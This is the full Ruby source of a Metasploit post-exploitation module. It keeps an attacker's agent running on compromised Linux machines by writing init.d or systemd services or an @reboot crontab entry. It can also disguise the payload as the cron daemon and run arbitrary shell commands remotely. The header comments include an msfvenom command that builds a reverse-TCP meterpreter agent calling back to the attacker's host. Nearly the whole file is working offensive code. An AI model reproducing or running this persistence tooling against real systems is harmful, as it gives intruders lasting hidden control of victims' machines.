##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : Kali_initd_persistence.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Tested on      : Linux Kali 2.0 | parrot OS
# video tutorial : https://www.youtube.com/watch?v=Ag7ufLORbFs
#
#
# [ DESCRIPTION ]
# Builds 'persistance' init.d startup script that allow users to persiste your agent
# (executable) on Linux distros at every startup. This post-module requires the agent
# allready deployed on target system and accepts any chmoded agents (elf|sh|py|rb|pl)
# to be auto-executed. It also allow is users to use 'systemd' or 'crontab' as an
# alternative way to persiste our payload in target system after exploitation.
# HINT: In Kali distos we are 'root' by default, so this post module does
# not require privilege escalation in systems were we are allready root ..
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on        => set SESSION 3
# The remote absoluct  path of binary to execute  => set REMOTE_PATH /root/agent.sh
# Time to wait for the agent to start             => set START_TIME 15
# Use 'init.d' to persiste our payload?           => set INITD true
# Use 'systemd' to persiste our payload?          => set SYSTEMD true
# Use 'crontab' to persiste our payload?          => set CRONTAB true
# The absoluct path of init.d directory           => set INIT_PATH /etc/init.d
# The absoluct path of crontab directory          => set CRON_PATH /etc/crontab
# The absoluct path of systemd directory          => set RPATH_SYSTEMD /etc/systemd/system
# Delete persistence script/configurations        => set DEL_PERSISTENCE true
# Execute one simple remote bash command          => set SINGLE_COM cat /etc/crontab
# Masquerade payload.sh as cron daemon? (T1036)   => set CRON_MASQUERADE true
# Set the absoluct path where to store logs       => set LOOT_FOLDER /root
# Use agents with shebang? (eg #!/usr/bin/python) => set SHEBANG true
# ---
# If sellected 'SHEBANG true' then agent execution will be based on is shebang
# EXAMPLE: #!/bin/sh agents will be executed         : sh /root/agent.sh
# EXAMPLE: #!/usr/bin/python agents will be executed : python /root/agent.py
# HINT: Rename your agent name to 'agent' when using 'SHEBANG true' option ..
# HINT: This funtion will not support 'SYSTEMD' or 'RPATH_SYSTEMD' options.
# ---
#
#
# [ PORT MODULE TO METASPLOIT DATABASE (execute in terminal) ]
# path=$(locate modules/post/linux/manage | grep -v '\doc' | grep -v '\documentation' | head -n 1)
# sudo cp kali_initd_persistence.rb $path/kali_initd_persistence.rb
#
#
# [ UPDATE MSFDB ]
# sudo service postgresql start
# sudo msfdb reinit   (optional)
# sudo msfconsole -x 'db_status;reload_all;exit -y'
#
#
# [ BUILD AGENT TO TEST (without-shebang) ]
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -f elf -o agent.elf
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/linux/manage/kali_initd_persistence
# msf post(kali_initd_persistence) > info
# msf post(kali_initd_persistence) > show options
# msf post(kali_initd_persistence) > show advanced options
# msf post(kali_initd_persistence) > set [option(s)]
# msf post(kali_initd_persistence) > exploit
##




#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Linux persistence [post-exploit]',
                        'Description'   => %q{
                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any chmoded agents (elf|sh|py|rb|pl) to be auto-executed. It also allow is users to use 'systemd' or 'crontab' as an alternative way to persiste our payload in target system after exploitation.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.9',
                        'DisclosureDate' => 'jun 2 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation (in-kali) ..
                        'Targets'        =>
                                [
                                         [ 'Linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts linux
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/ny69NS' ],
                                         [ 'URL', 'http://goo.gl/LZG1LQ' ],
                                         [ 'URL', 'http://goo.gl/281pVK' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                ],
			'DefaultOptions' =>
				{
                                         'LOOT_FOLDER' => '~/.msf4/loot', # Default loot folder absoluct path
                                         'INIT_PATH' => '/etc/init.d',  # Default init.d directory full path
                                         'CRON_PATH' => '/etc/crontab', # Default crontab directory  full path
                                         'RPATH_SYSTEMD' => '/etc/systemd/system', # Default systemd directory full path
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptBool.new('INITD', [ false, 'Use init.d to persiste our payload?', false]),
                                OptBool.new('SYSTEMD', [ false, 'Use systemd to persiste our payload?', false]),
                                OptBool.new('CRONTAB', [ false, 'Use crontab to persiste our payload?', false]),
                                OptString.new('SESSION', [ true, 'The session number to run this module on', 1]),
                                OptString.new('REMOTE_PATH', [ false, 'The remote absoluct path of binary to execute'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('CRON_PATH', [ false, 'The absoluct path of crontab file']),
                                OptString.new('INIT_PATH', [ false, 'The absoluct path of init.d directory']),
                                OptString.new('RPATH_SYSTEMD', [ false, 'The absoluct path of systemd directory']),
                                OptString.new('LOOT_FOLDER', [ false, 'Set the absoluct path where to store logs']),
                                OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)', false]),
                                OptString.new('SINGLE_COM', [ false, 'Execute one simple bash command (eg uname -a)']),
                                OptString.new('START_TIME', [ false, 'Time to wait for the agent to start (in seconds)', 8]),
                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence scripts/configurations?', false]),
                                OptBool.new('CRON_MASQUERADE', [ false, 'Masquerade payload.sh as cron daemon? (T1036)', false])
                        ], self.class) 

        end




# ---------------------------------------------------
# Build persistence on remote system ..
# ---------------------------------------------------
def ls_stage1

  session = client
  sysnfo = session.sys.config.sysinfo
  stime = datastore['START_TIME'] # 8 (sec to start the agent)
  remote_path = datastore['REMOTE_PATH'] # /root/agent



# ---------------------------------------------------
# Using systemd service creation
# ---------------------------------------------------
if datastore['SYSTEMD'] == true
# make sure all options needed by this fuction are set
if datastore['REMOTE_PATH'] == 'nil' || datastore['RPATH_SYSTEMD'] == 'nil'
  print_error("[ERROR] set REMOTE_PATH | RPATH_SYSTEMD options before continue.")
  return nil
end


# prevent other pesistence functions from runing.
if datastore['INITD'] == true || datastore['CRONTAB'] == true
  print_error("[ERROR] unset INITD and CRONTAB options before continue.")
  print_warning("we can only run one persistence technic at a time.")
  return nil
end
print_status("Persist: #{remote_path} on target system.")
Rex::sleep(1.0)

    #
    # Check if persistence its allready active ..
    #
    serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
    serv_file = "#{serv_path}/persistence.service"
    if session.fs.file.exist?(serv_file)
      print_error("systemd: #{serv_file} found.")
      print_warning("Post-module reports that persistence its active.")
      return nil
    end
    #
    # Check if agent its deployed (remote) ..
    #
    unless session.fs.file.exist?(remote_path)
      print_error("agent: #{remote_path} not found.")
      print_warning("Please upload your agent before running this funtion.")
      return nil
    else
      print_status("Remote payload absoluct path found.")
      Rex::sleep(1.0)
    end

      #
      # This is the systemd script that provides persistence on startup ..
      #
      print_status("Writing systemd persistence startup script.")
      Rex::sleep(1.0)

      systemd_data =
      "[Unit]\n" +
      "After=network.target network-online.target\n" +
      "[Service]\n" +
      "ExecStart=#{remote_path}\n" +
      "[Install]\n" +
      "WantedBy=default.target"

      path = "#{serv_file}"
        fd = session.fs.file.new(path, 'wb')
        fd.write(systemd_data)
        fd.close
      print_status("Service path: #{serv_file}")
      Rex::sleep(1.0)

      #
      # Config systemd startup service (chmod + daemon-reload + systemctl enable)
      #
      if session.fs.file.exist?(serv_file)
        print_status("Config systemd persistence script.")
        cmd_exec("chmod 664 #{serv_file}")
        Rex::sleep(1.0)
        print_status("Reloading systemctl daemon.")
        cmd_exec("systemctl daemon-reload")
        Rex::sleep(1.0)
        print_status("Enable systemctl service.")
        cmd_exec("systemctl enable persistence.service")
        Rex::sleep(1.5)
        #
        # final displays to user
        #
        print_good("Persistence achieved on: #{sysnfo['Computer']}")
        Rex::sleep(1.0)
        print_warning("To start service: systemctl start persistence.service")
        Rex::sleep(1.0)
      else
        print_error("systemd script: #{serv_file} not found.")
        print_warning("Persistence on: #{sysnfo['Computer']} not achieved.")
        return nil
      end


    #
    # build logfile
    #
    f = []
    rand = Rex::Text.rand_text_alpha(5)
    loot_folder = datastore['LOOT_FOLDER']
    File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
      f.write("# kali_initd_persistence\n")
      f.write("####\n")
      f.write("service: init.d\n")
      f.write("service path: #{serv_file}\n")
      f.write("payload: #{remote_path}")
      f.close
    end
    print_warning("logfile stored: #{loot_folder}/revert_#{rand}.rc")
end



# ---------------------------------------------------
# use init.d service creation
# ---------------------------------------------------
if datastore['INITD'] == true
# make sure all options needed by this fuction are set
if datastore['REMOTE_PATH'] == 'nil' || datastore['INIT_PATH'] == 'nil' || datastore['START_TIME'] == 'nil'
  print_error("[ERROR] set REMOTE_PATH | INIT_PATH | START_TIME options before continue.")
  return nil
end


# prevent other pesistence functions from runing.
if datastore['SYSTEMD'] == true || datastore['CRONTAB'] == true
  print_error("[ERROR] unset SYSTEMD and CRONTAB options before continue.")
  print_warning("we can only run one persistence technic at a time.")
  return nil
end
print_status("Persist: #{remote_path} on target system.")
Rex::sleep(1.0)

    #
    # Check if persistence its allready active ..
    #
    init = datastore['INIT_PATH']          # /etc/init.d
    script_check = "#{init}/persistance"   # /etc/init.d/persistance
    if session.fs.file.exist?(script_check)
      print_error("init.d: #{script_check} found.")
      print_warning("Post-module reports that persistence its active.")
      return nil
    end
    #
    # Check if agent its deployed (remote) ..
    #
    unless session.fs.file.exist?(remote_path)
      print_error("agent: #{remote_path} not found.")
      print_warning("Please upload your agent before running this funtion.")
      return nil
    else
      print_status("Remote payload absoluct path found.")
      Rex::sleep(1.0)
    end

    #
    # Sellect how agent will execute (in persistence script call)
    #
    if datastore['SHEBANG'] == true
    print_warning("Payload with shebang sellected.")
    Rex::sleep(1.0)
      #
      # If used agents with SHEBANG (eg #!/usr/bin/python)
      # TODO: Check Extensions execution using bash ( elf | sh | py | rb | pl ) 
      #
      if remote_path =~ /.elf/
        print_status("Payload extension sellected: .elf")
        trigger = "."
      elsif remote_path =~ /.sh/
        print_status("Payload extension sellected: bash")
        trigger = "sh "
      elsif remote_path =~ /.py/
        print_status("Payload extension sellected: python")
        trigger = "python "
      elsif remote_path =~ /.rb/
        print_status("Payload extension sellected: ruby")
        trigger = "ruby "
      elsif remote_path =~ /.pl/
        print_status("Payload extension sellected: perl")
        trigger = "perl "
      else
        print_error("Payload extension not supported.")
        print_warning("Please use [sh|elf|py|rb|pl] payload extensions.")
        print_warning("OR set 'SHELBANG false' to execute payload: ./root/agent")
        return nil
      end
    #
    # WITHOUTH-SHEBANG-AGENTS-EXECUTION (most of venom v1.0.13 builds)
    # Default way to execute one agent shelbang free: ./root/agent
    #
    else
      trigger = "."
    end

      #
      # This is the init.d script that provides persistence on startup ..
      #
      print_status("Writing init.d persistence startup script.")
      Rex::sleep(1.0)

      initd_data =
      "#!/bin/sh\n" +
      "### BEGIN INIT INFO\n" +
      "# Provides:          persistence on kali\n" +
      "# Required-Start:    $network $local_fs $remote_fs\n" +
      "# Required-Stop:     $remote_fs $local_fs\n" +
      "# Default-Start:     2 3 4 5\n" +
      "# Default-Stop:      0 1 6\n" +
      "# Short-Description: Persiste your agent in kali linux distros.\n" +
      "# Description:       Allows users to persiste your binary (elf) in kali linux systems\n" +
      "### END INIT INFO\n" +
      "# Give a little time to execute agent\n" +
      "sleep #{stime} > /dev/null\n" +
      "#{trigger}#{remote_path}"

      path = "#{script_check}"
        fd = session.fs.file.new(path, 'wb')
        fd.write(initd_data)
        fd.close
      print_status("Remote service path: #{script_check}")
      Rex::sleep(1.0)

      #
      # Config init.d startup service (chmod + update-rc.d)
      #
      if session.fs.file.exist?(script_check)
        print_status("Config init.d persistence script.")
        cmd_exec("chmod 755 #{script_check}")
        Rex::sleep(1.0)
        print_status("Update init.d service status (symlinks).")
        # update-rc.d persistance defaults # 97 03
        cmd_exec("update-rc.d persistance defaults")
        Rex::sleep(1.5)
        # final displays
        print_good("Persistence achieved on: #{sysnfo['Computer']}")
        Rex::sleep(1.0)
      else
        print_error("init.d script: #{script_check} not found.")
        print_warning("Persistence on: #{sysnfo['Computer']} not achieved.")
        return nil
      end


    #
    # build logfile
    #
    f = []
    rand = Rex::Text.rand_text_alpha(5)
    loot_folder = datastore['LOOT_FOLDER']
    File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
      f.write("# kali_initd_persistence\n")
      f.write("####\n")
      f.write("service: systemd\n")
      f.write("service path: #{script_check}\n")
      f.write("payload: #{remote_path}")
      f.close
    end
    print_warning("logfile stored: #{loot_folder}/revert_#{rand}.rc")
end



# ---------------------------------------------------
# use crontab service creation
# ---------------------------------------------------
if datastore['CRONTAB'] == true
# make sure all options needed by this fuction are set
if datastore['REMOTE_PATH'] == 'nil' || datastore['CRON_PATH'] == 'nil'
  print_error("[ERROR] set REMOTE_PATH | CRON_PATH options before continue.")
  return nil
end


# prevent other pesistence functions from runing.
if datastore['INITD'] == true || datastore['SYSTEMD'] == true
  print_error("[ERROR] unset INITD and SYSTEMD options before continue.")
  print_warning("we can only run one persistence technic at a time.")
  return nil
end
print_status("Persist: #{remote_path} on target system.")
Rex::sleep(1.0)

    #
    # Check if crontab file exists ..
    #
    sysnfo = session.sys.config.sysinfo
    serv_file = datastore['CRON_PATH'] # /etc/crontab
    if session.fs.file.exist?(serv_file)
      print_status("Remote path: #{serv_file} found.")
      Rex::sleep(1.0)
    else
      print_error("Remote path: #{serv_file} not found.")
      return nil
    end
    #
    # Check if agent its deployed (remote) ..
    #
    unless session.fs.file.exist?(remote_path)
      print_error("Payload: #{remote_path} not found.")
      print_warning("Please upload your payload before running this funtion.")
      return nil
    else
      print_status("Remote payload absoluct path found.")
      Rex::sleep(1.0)
    end


   #
   # mitre ATT&CK T1036 [masquerade]
   # Copies sh script, renames it as crond, to masquerade as the cron daemon.
   #
   if datastore['CRON_MASQUERADE'] == true
   print_good("Mitre ATT&CK T1036 [masquerade as cron daemon]")
   Rex::sleep(1.0)
     if remote_path =~ /.sh/
       # rename remote file to crond (cron file)
       print_status("Renaming: #{remote_path} to: /tmp/crond")
       client.fs.file.mv("#{remote_path}","/tmp/crond")
       remote_path = "/tmp/crond"
       Rex::sleep(1.0)
     else
       print_error("This function only accepts payloads.sh (bash)")
       Rex::sleep(1.0)
       print_warning("Using: #{remote_path} as payload name.")
       Rex::sleep(1.5)
     end
   end

      #
      # This is the crontab command that provides persistence on startup ..
      #
      print_status("Writing crontab schedule task (@reboot).")
      Rex::sleep(1.0)
      print_status("Executing: echo \"@reboot \* \* \* \* root #{remote_path}\" >> #{serv_file}")
      cmd_exec("echo \"@reboot * * * * root #{remote_path}\" >> #{serv_file}")
      Rex::sleep(1.0)
      print_status("Remote reload crontab daemon.")
      cmd_exec("sudo service cron reload")
      Rex::sleep(1.0)

    # final displays
    print_good("Persistence achieved on: #{sysnfo['Computer']}")
    Rex::sleep(1.0)
    print_warning("Payload: #{remote_path} will execute at every reboot.")
    Rex::sleep(1.0)
end

    #
    # build logfile
    #
    f = []
    rand = Rex::Text.rand_text_alpha(5)
    loot_folder = datastore['LOOT_FOLDER']
    File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
      f.write("# kali_initd_persistence\n")
      f.write("####\n")
      f.write("service: crontab\n")
      f.write("service path: #{serv_file}\n")
      f.write("payload: #{remote_path}")
      f.close
    end
    print_warning("logfile stored: #{loot_folder}/revert_#{rand}.rc")
end








# ---------------------------------------------------
# Delete persistence ..
# ---------------------------------------------------
def ls_stage2

  session = client
  sysnfo = session.sys.config.sysinfo
  print_status("Delete remote persistence schedules.")
  Rex::sleep(1.0)



# ---------------------------------------------------
# Deleting systemd service persistence schedules
# ---------------------------------------------------
if datastore['SYSTEMD'] == true
# make sure all options needed by this fuction are set
if datastore['RPATH_SYSTEMD'] == 'nil' || datastore['SESSION'] == 'nil'
  print_error("[ERROR] set RPATH_SYSTEMD | SESSION options before continue.")
  return nil
end


# prevent other pesistence functions from runing.
if datastore['INITD'] == true || datastore['CRONTAB'] == true
  print_error("[ERROR] unset INITD and CRONTAB options before continue.")
  print_warning("we can only run one persistence technic at a time.")
  return nil
end
    #
    # Check systemd persiste script existance ..
    #
    serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
    serv_file = "#{serv_path}/persistence.service"
    unless session.fs.file.exist?(serv_file)
      print_error("script: #{serv_file} not found .")
      print_warning("Post-module reports that none persistence was found.")
      return nil
    else
      print_status("Persistence script absoluct path found.")
      Rex::sleep(1.0)
    end

      #
      # Delete systemd script ..
      #
      print_status("Removing script from systemd directory.")
      cmd_exec("rm -f #{serv_file}")
      Rex::sleep(1.0)
      print_status("Reloading systemctl daemon process.")
      cmd_exec("sudo systemctl daemon-reload")
      Rex::sleep(1.5)

    #
    # Check systemd persiste script existance (after delete) ..
    #
    if session.fs.file.exist?(serv_file)
      print_error("script: #{serv_file} not proper deleted.")
      print_warning("Please manually delete : rm -f #{serv_file}")
      print_warning("Please manually execute: sudo systemctl daemon-reload")
      return nil
    else
      print_good("Persistence deleted from: #{sysnfo['Computer']}")
      print_warning("This module will NOT delete the agent from target.")
      Rex::sleep(1.0)
    end
end




# ---------------------------------------------------
# Deleting init.d service persistence schedules
# ---------------------------------------------------
if datastore['INITD'] == true
# make sure all options needed by this fuction are set
if datastore['INIT_PATH'] == 'nil' || datastore['SESSION'] == 'nil'
  print_error("[ERROR] set INIT_PATH | SESSION options before continue.")
  return nil
end


# prevent other pesistence functions from runing.
if datastore['SYSTEMD'] == true || datastore['CRONTAB'] == true
  print_error("[ERROR] unset SYSTEMD and CRONTAB options before continue.")
  print_warning("we can only run one persistence technic at a time.")
  return nil
end
    #
    # Check init.d persiste script existance ..
    #
    init = datastore['INIT_PATH']          # /etc/init.d
    script_check = "#{init}/persistance"   # /etc/init.d/persistance
    unless session.fs.file.exist?(script_check)
      print_error("script: #{script_check} not found.")
      print_error("Post-module reports that none persistence was found.")
      return nil
    else
      print_status("Persistence script absoluct path found.")
      Rex::sleep(1.0)
    end

      #
      # Delete init.d script ..
      #
      print_status("Deleting persistence service (symlinks).")
      cmd_exec("update-rc.d persistance remove")
      Rex::sleep(1.5)
      print_status("Removing script from init.d directory.")
      cmd_exec("sudo rm -f #{script_check}")
      Rex::sleep(1.0)

    #
    # Check init.d persiste script existance (after delete) ..
    #
    if session.fs.file.exist?(script_check)
      print_error("script: #{script_check} not proper deleted.")
      print_warning("Please manually delete : rm -f #{init}/persistance")
      print_warning("Please manually execute: update-rc.d persistance remove")
      return nil
    else
      print_good("Persistence deleted from: #{sysnfo['Computer']}")
      print_warning("This module will NOT delete the agent from target.")
      Rex::sleep(1.0)
    end
end



# ---------------------------------------------------
# deleting crontab persistence schedules
# ---------------------------------------------------
if datastore['CRONTAB'] == true
# make sure all options needed by this fuction are set
if datastore['REMOTE_PATH'] == 'nil' || datastore['CRON_PATH'] == 'nil'
  print_error("[ERROR] set REMOTE_PATH | CRON_PATH options before continue.")
  return nil
end


# prevent other pesistence functions from runing.
if datastore['INITD'] == true || datastore['SYSTEMD'] == true
  print_error("[ERROR] unset INITD and SYSTEMD options before continue.")
  print_warning("we can only run one persistence technic at a time.")
  return nil
end
    #
    # Check for /etc/crontab file existance ..
    #
    serv_file = datastore['CRON_PATH'] # /etc/crontab
    unless session.fs.file.exist?(serv_file)
      print_error("Remote path: #{serv_file} not found.")
      return nil
    else
      print_status("Remote crontab file absoluct path found.")
      Rex::sleep(1.0)
    end


      #
      # Delete crontab command line on crontab file ..
      #
      remote_path = datastore['REMOTE_PATH']
      print_status("Deleting persistence service (crontab)")
      Rex::sleep(1.0)
      print_status("Payload absoluct path: #{remote_path}")
      Rex::sleep(1.0)
      print_status("Executing: sed -i \"s|@reboot \\\\* \\\\* \\\\* \\\\* root #{remote_path}||\" #{serv_file}")
      # we need to escape * because sed see them as special chars.
      cmd_exec("sed -i \"s|@reboot \\* \\* \\* \\* root #{remote_path}||\" #{serv_file}")
      # we need to escape the remote_path var because sed command uses /// as command separator
      # parse = app_path.gsub('/', '\/')
      # session.shell_command("sed -i 's|@reboot \* \* \* \* root #{parse}||' /etc/crontab")
      print_status("Remote Reload crontab daemon.")
      cmd_exec("service cron reload")
      Rex::sleep(1.0)


  # Final displays to user ..
  print_good("Persistence deleted from: #{sysnfo['Computer']}")
  print_warning("This module will NOT delete the agent from target.")
  Rex::sleep(1.0)
end


  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ---------------------------------------------------
# Execute single_command (shell) and return output ..
# ---------------------------------------------------
def ls_stage3

  session = client
  sysnfo = session.sys.config.sysinfo
  exe_com = datastore['SINGLE_COM']  # uname -a

  # make sure all options needed by this fuction are set
  if datastore['SINGLE_COM'] == 'nil' || datastore['SESSION'] == 'nil'
    print_error("[ERROR] set SINGLE_COM | SESSION options before continue.")
    return nil
  end

      #
      # msf API call to execute bash command remotelly  ..
      #
      print_status("Executing remote bash command.")
      Rex::sleep(1.0)
      print_good("Executing: #{exe_com}")
      Rex::sleep(1.0)
      output = cmd_exec("#{exe_com}")
      print_line("")
      print_line(output)
      print_line("")

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ---------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ---------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd

    # Print banner and scan results on screen
    print_line("    +-------------------------------------------+")
    print_line("    |   Linux persistence [post-exploitation]   |")
    print_line("    |           Author : r00t-3xp10it           |")
    print_line("    +-------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Target Architecture : #{sysnfo['Architecture']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # check for proper operative system (Linux)
    #
    unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
      print_error("[ABORT]: This module only works againt Linux systems")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    unless runtor =~ /uid=0/ || runtor =~ /root/
      print_error("[ABORT]: Root access is required in non-Kali distros ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    unless sysinfo.nil? || sysinfo == ''
      print_good("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end


# --------------------------------------------
# Selected settings to run
# --------------------------------------------

    if datastore['REMOTE_PATH'] && datastore['DEL_PERSISTENCE'] == false
      # jump to persistence exploit function
      ls_stage1
    end

    if datastore['DEL_PERSISTENCE'] == true
      # jump to delete persistence function
      ls_stage2
    end

    if datastore['SINGLE_COM']
      ls_stage3
    end
  end
end

